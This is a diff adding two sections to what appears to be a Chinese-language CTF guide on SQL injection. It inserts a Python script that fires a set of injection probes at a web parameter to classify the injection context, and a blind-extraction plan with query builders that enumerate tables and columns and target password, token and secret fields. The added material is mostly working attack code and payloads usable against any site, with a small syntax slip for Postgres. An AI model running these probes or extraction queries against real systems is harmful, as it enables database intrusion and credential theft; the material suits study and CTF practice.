@@ -125,6 +125,65 @@ related_articles: []
 
 如果只有“错误页变了”但数据不变，先记录 SQL parser 已经接触到 payload；下一步换布尔/时间表达式确认语义执行。
 
+### 1.4.1 上下文自动分类器
+
+CTF 里最浪费时间的是把 payload 打错上下文。先用一组低成本 probe 给参数打标签，再进入对应分支。
+
+```python
+# sqli_context_classifier.py — SQL 注入上下文分类
+import hashlib
+import requests
+
+PROBES = {
+    "quote_error": "'",
+    "int_bool_true": "1 AND 1=1",
+    "int_bool_false": "1 AND 1=2",
+    "str_bool_true": "' AND '1'='1",
+    "str_bool_false": "' AND '1'='2",
+    "like_break": "%' AND '1'='1",
+    "order_case": "CASE WHEN(1=1) THEN 1 ELSE 2 END",
+    "limit_expr": "1 OFFSET 0",
+    "json_path_break": "x') OR 1=1-- ",
+}
+
+def sig(resp):
+    text = resp.text[:4096]
+    return {
+        "status": resp.status_code,
+        "len": len(resp.text),
+        "hash": hashlib.sha256(text.encode(errors="ignore")).hexdigest()[:12],
+        "location": resp.headers.get("Location", ""),
+    }
+
+def classify_param(url, param="id", baseline="1"):
+    s = requests.Session()
+    base = sig(s.get(url, params={param: baseline}, timeout=8))
+    out = {"baseline": base, "probes": {}}
+    for name, payload in PROBES.items():
+        r = s.get(url, params={param: payload}, timeout=8, allow_redirects=False)
+        out["probes"][name] = sig(r)
+
+    def changed(a):
+        return a["status"] != base["status"] or abs(a["len"] - base["len"]) > 80 or a["hash"] != base["hash"]
+
+    hints = []
+    if changed(out["probes"]["quote_error"]):
+        hints.append("quoted_or_parser_error")
+    if changed(out["probes"]["int_bool_false"]) and not changed(out["probes"]["int_bool_true"]):
+        hints.append("integer_where")
+    if changed(out["probes"]["str_bool_false"]) and not changed(out["probes"]["str_bool_true"]):
+        hints.append("string_where")
+    if changed(out["probes"]["like_break"]):
+        hints.append("like_context")
+    if changed(out["probes"]["order_case"]):
+        hints.append("order_by_context")
+    if changed(out["probes"]["json_path_break"]):
+        hints.append("json_path_context")
+
+    out["hints"] = hints or ["unknown_use_time_or_error_probe"]
+    return out
+```
+
 ### 1.5 DBMS 指纹速查矩阵
 
 | DBMS | 版本函数 | 当前库/用户 | 时间函数 | Catalog |
@@ -294,6 +353,52 @@ extract_ascii(
 ```
 
 失败样本：True/False 长度随机跳动，说明页面有动态内容；改用固定字段、状态码、跳转位置、特定 DOM 片段或响应哈希去判定。
+
+### 4.4 结果集枚举策略
+
+抽数据时先抽“小而稳定”的元信息，再抽大字段；先定位表名、列名、行数、长度，再逐行分段。不要一上来抽 `GROUP_CONCAT(password)`，很容易被长度、编码和超时截断。
+
+| 目标 | SQL 表达式 | 判断 |
+|---|---|---|
+| 当前库 | `database()` / `current_database()` | 确认 DBMS 与权限 |
+| 表数量 | `COUNT(*) FROM information_schema.tables ...` | 判断枚举规模 |
+| 第 N 张表名长度 | `LENGTH((SELECT table_name ... LIMIT N,1))` | 先定长度 |
+| 第 N 张表名字符 | `SUBSTR((SELECT table_name ...),pos,1)` | 二分提取 |
+| 列名 | `information_schema.columns` | 优先找 `user/pass/token/flag` |
+| 行数 | `COUNT(*) FROM target_table` | 判断是否需要分页 |
+| 敏感字段长度 | `LENGTH(password)` | 避免超长盲抽 |
+
+```python
+# blind_plan.py — 生成盲注抽取任务
+INTERESTING_COLUMNS = ["flag", "password", "passwd", "pwd", "token", "secret", "key", "email", "role"]
+
+def table_name_expr(offset, dbms="mysql"):
+    if dbms == "mysql":
+        return (
+            "SELECT table_name FROM information_schema.tables "
+            "WHERE table_schema=database() "
+            f"ORDER BY table_name LIMIT {offset},1"
+        )
+    if dbms == "postgres":
+        return (
+            "SELECT tablename FROM pg_catalog.pg_tables "
+            "WHERE schemaname NOT IN ('pg_catalog','information_schema') "
+            f"ORDER BY tablename LIMIT 1 OFFSET {offset}"
+        )
+    if dbms == "sqlite":
+        return f"SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {offset}"
+    raise ValueError(dbms)
+
+def column_name_expr(table, offset, dbms="mysql"):
+    if dbms in {"mysql", "postgres"}:
+        return (
+            "SELECT column_name FROM information_schema.columns "
+            f"WHERE table_name='{table}' ORDER BY column_name LIMIT {offset},1"
+        )
+    if dbms == "sqlite":
+        return f"SELECT sql FROM sqlite_master WHERE name='{table}'"
+    raise ValueError(dbms)
+```
 
 ## 5. 时间盲注 (Time-based)
 
